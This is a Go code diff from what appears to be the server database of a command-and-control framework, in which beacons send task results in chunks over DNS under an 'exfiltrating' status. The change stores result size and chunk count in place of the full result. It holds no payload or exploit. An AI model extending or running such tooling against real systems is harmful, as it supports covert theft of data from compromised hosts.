@@ -1230,12 +1230,12 @@ func (d *MasterDatabase) SaveResultChunk(taskID, beaconID, dnsServerID string, c
 				if err == nil {
 					fmt.Printf("[Master DB] Received complete assembled result from %s: task %s, %d chunks, %d bytes (waiting for RESULT_COMPLETE)\n",
 						dnsServerID, taskID, totalChunks, len(data))
-					// Update task with result but don't mark complete - wait for RESULT_COMPLETE signal
+					// Update task metadata - result is in task_results table
 					_, updateErr := d.db.Exec(`
-						UPDATE tasks SET result = ?, updated_at = ? WHERE id = ?
-					`, data, now, taskID)
+						UPDATE tasks SET result_size = ?, chunk_count = ?, updated_at = ? WHERE id = ?
+					`, len(data), totalChunks, now, taskID)
 					if updateErr != nil {
-						fmt.Printf("[Master DB] Error updating task with assembled result: %v\n", updateErr)
+						fmt.Printf("[Master DB] Error updating task metadata: %v\n", updateErr)
 					}
 				} else {
 					fmt.Printf("[Master DB] Error saving assembled result: %v\n", err)
@@ -3004,18 +3004,18 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 	d.mutex.Lock()
 	defer d.mutex.Unlock()
 
-	// Check current task status
+	// Check current task status and metadata
 	var status string
-	var resultData sql.NullString
+	var resultSize, chunkCount int
 	err := d.db.QueryRow(`
-		SELECT status, result FROM tasks WHERE id = ?
-	`, taskID).Scan(&status, &resultData)
+		SELECT status, COALESCE(result_size, 0), COALESCE(chunk_count, 0) FROM tasks WHERE id = ?
+	`, taskID).Scan(&status, &resultSize, &chunkCount)
 
 	if err != nil {
 		return fmt.Errorf("task not found: %w", err)
 	}
 
-	fmt.Printf("[Master DB] RESULT_COMPLETE for task %s (status=%s, totalChunks=%d)\n", taskID, status, totalChunks)
+	fmt.Printf("[Master DB] RESULT_COMPLETE for task %s (status=%s, totalChunks=%d, storedSize=%d)\n", taskID, status, totalChunks, resultSize)
 
 	// If already completed, nothing to do
 	if status == "completed" {
@@ -3023,28 +3023,28 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 		return nil
 	}
 
-	// If status is "exfiltrating" and result is already assembled, mark complete
-	if status == "exfiltrating" && resultData.Valid && resultData.String != "" {
-		fmt.Printf("[Master DB] Task %s has assembled result, marking complete\n", taskID)
+	// If status is "exfiltrating" and result_size > 0, result is already in task_results, just mark complete
+	if status == "exfiltrating" && resultSize > 0 {
+		fmt.Printf("[Master DB] Task %s has result in task_results (%d bytes), marking complete\n", taskID, resultSize)
 		d.markTaskCompleted(taskID)
 		return nil
 	}
 
 	// If multi-chunk result, check if all chunks present and trigger reassembly
 	if totalChunks > 1 {
-		var chunkCount int
+		var receivedChunks int
 		err = d.db.QueryRow(`
 			SELECT COUNT(*) FROM task_results
 			WHERE task_id = ? AND chunk_index > 0
-		`, taskID).Scan(&chunkCount)
+		`, taskID).Scan(&receivedChunks)
 
 		if err != nil {
 			return fmt.Errorf("failed to count chunks: %w", err)
 		}
 
-		fmt.Printf("[Master DB] Task %s has %d/%d chunks\n", taskID, chunkCount, totalChunks)
+		fmt.Printf("[Master DB] Task %s has %d/%d chunks\n", taskID, receivedChunks, totalChunks)
 
-		if chunkCount == totalChunks {
+		if receivedChunks == totalChunks {
 			// All chunks present, trigger reassembly synchronously (we already have the mutex)
 			fmt.Printf("[Master DB] All chunks present for task %s, assembling result\n", taskID)
 
@@ -3100,7 +3100,7 @@ func (d *MasterDatabase) MarkTaskCompleteFromBeacon(taskID, beaconID string, tot
 
 			fmt.Printf("[Master DB] ✓ Task %s assembled and marked as completed (%d bytes)\n", taskID, len(assembledResult))
 		} else {
-			fmt.Printf("[Master DB] Waiting for remaining chunks for task %s (%d/%d received)\n", taskID, chunkCount, totalChunks)
+			fmt.Printf("[Master DB] Waiting for remaining chunks for task %s (%d/%d received)\n", taskID, receivedChunks, totalChunks)
 			// Return success - we'll wait for more chunks to arrive
 			return nil
 		}
